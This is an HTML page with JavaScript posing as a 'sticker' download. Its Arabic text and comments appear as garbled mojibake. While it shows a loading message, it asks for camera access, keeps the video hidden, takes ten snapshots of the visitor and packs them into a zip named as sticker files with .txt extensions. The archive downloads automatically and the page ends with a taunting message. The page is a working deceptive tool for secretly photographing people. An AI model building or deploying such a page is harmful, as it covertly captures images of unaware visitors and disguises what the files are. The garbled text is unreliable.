<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ØªØ·Ø¨ÙŠÙ‚ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§</title>
    <style>
        body {
            text-align: center;
            font-family: Arial, sans-serif;
            direction: rtl;
        }
        #loadingText {
            font-size: 20px;
            color: #555;
        }
        #video {
            display: none; /* Ø¥Ø®ÙØ§Ø¡ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ */
        }
    </style>
</head>
<body>
    <div id="loadingText">Ø¬Ø§Ø± ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø³ØªÙŠÙƒØ± Ù„ÙŠ Ù…ÙÙŠÙ‡ Ù…ÙŠØªØ´Ø§Ù</div>
    <video id="video" autoplay></video> <!-- Ø¹Ù†ØµØ± Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ù…Ø®ÙÙŠ -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
    <script>
        let capturedImages = [];
        let captureCount = 0;
        let cameraStream = null;

        // Ø·Ù„Ø¨ Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø¨Ø¹Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø©
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(function(stream) {
                cameraStream = stream;  // Ø­ÙØ¸ Ø§Ù„Ù€ stream Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù…Ù‡ Ù„Ø§Ø­Ù‚Ù‹Ø§
                let videoElement = document.getElementById('video');
                videoElement.srcObject = stream;

                // Ø¨Ø¯Ø£ Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ± Ø¨Ø¹Ø¯ 4 Ø«ÙˆØ§Ù†Ù Ù…Ù† ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø©
                setTimeout(function() {
                    // Ù†Ø¨Ø¯Ø£ Ø¨Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ± Ø¨Ø´ÙƒÙ„ ØªÙ„Ù‚Ø§Ø¦ÙŠ
                    let captureInterval = setInterval(function() {
                        if (captureCount < 10) {
                            captureImage(videoElement);
                            captureCount++;
                        } else {
                            clearInterval(captureInterval);
                            saveImagesAsZip();
                        }
                    }, 400);  // Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø© ÙƒÙ„ 400 Ù…Ù„Ù„ÙŠ Ø«Ø§Ù†ÙŠØ© Ø®Ù„Ø§Ù„ 4 Ø«ÙˆØ§Ù†Ù
                }, 4000);  // Ø§Ù†ØªØ¸Ø§Ø± 4 Ø«ÙˆØ§Ù†Ù Ù‚Ø¨Ù„ Ø¨Ø¯Ø¡ Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±
            })
            .catch(function(error) {
                alert("ÙØ´Ù„ ÙÙŠ Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§: " + error);
            });

        // Ø¯Ø§Ù„Ø© Ù„Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø© Ù…Ù† Ø§Ù„ÙÙŠØ¯ÙŠÙˆ
        function captureImage(videoElement) {
            let canvas = document.createElement("canvas");
            canvas.width = videoElement.videoWidth;
            canvas.height = videoElement.videoHeight;
            let ctx = canvas.getContext("2d");
            ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
            capturedImages.push(canvas.toDataURL("image/jpeg"));
        }

        // Ø­ÙØ¸ Ø§Ù„ØµÙˆØ± ÙÙŠ Ù…Ù„Ù Ù…Ø¶ØºÙˆØ· Ù…Ø¹ ØªØºÙŠÙŠØ± Ø§Ù…ØªØ¯Ø§Ø¯Ù‡Ø§ Ø¥Ù„Ù‰ .txt
        function saveImagesAsZip() {
            let zip = new JSZip();
            for (let i = 0; i < capturedImages.length; i++) {
                let imageData = capturedImages[i].split(',')[1];  // Ø¥Ø²Ø§Ù„Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ØºÙŠØ± Ø§Ù„Ø¶Ø±ÙˆØ±ÙŠØ©
                let fileName = "Ø³ØªÙŠÙƒØ±" + (i + 1) + ".txt"; // ØªØºÙŠÙŠØ± Ø§Ù„Ø§Ø³Ù… ÙˆØ§Ù„Ø§Ù…ØªØ¯Ø§Ø¯ Ø¥Ù„Ù‰ .txt
                zip.file(fileName, imageData, {base64: true});
            }

            zip.generateAsync({ type: "blob" })
                .then(function(content) {
                    // Ø­ÙØ¸ Ø§Ù„Ù…Ù„Ù Ø§Ù„Ù…Ø¶ØºÙˆØ· ØªÙ„Ù‚Ø§Ø¦ÙŠÙ‹Ø§
                    let link = document.createElement("a");
                    link.href = URL.createObjectURL(content);
                    link.download = "stickers-mafihom-maytchaf.zip";
                    link.click();  // ÙŠÙ‚ÙˆÙ… Ø¨ØªÙ†Ø²ÙŠÙ„ Ø§Ù„Ø£Ø±Ø´ÙŠÙ Ù…Ø¨Ø§Ø´Ø±Ø©

                    // Ø¨Ø¹Ø¯ Ø§Ù„Ø§Ù†ØªÙ‡Ø§Ø¡ Ù…Ù† Ø§Ù„ØªØ­Ù…ÙŠÙ„ØŒ Ø¥Ø®ÙØ§Ø¡ Ø§Ù„Ù†Øµ "Ø¬Ø§Ø± ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø³ØªÙŠÙƒØ± Ù„ÙŠ Ù…ÙÙŠÙ‡ Ù…ÙŠØªØ´Ø§Ù"
                    document.getElementById('loadingText').style.display = 'none';

                    // Ø¹Ø±Ø¶ Ø§Ù„Ù†Øµ Ø§Ù„Ø¬Ø¯ÙŠØ¯
                    let newText = document.createElement('h1');
                    newText.innerText = "Ø§Ù„Ø²Ù…Ø± Ù„Ø§ Ø´ÙØªÙŠ Ø³ØªÙŠÙƒØ±ğŸ‘½ğŸ¤–";
                    document.body.appendChild(newText);
                });
        }
    </script>
</body>
</html>
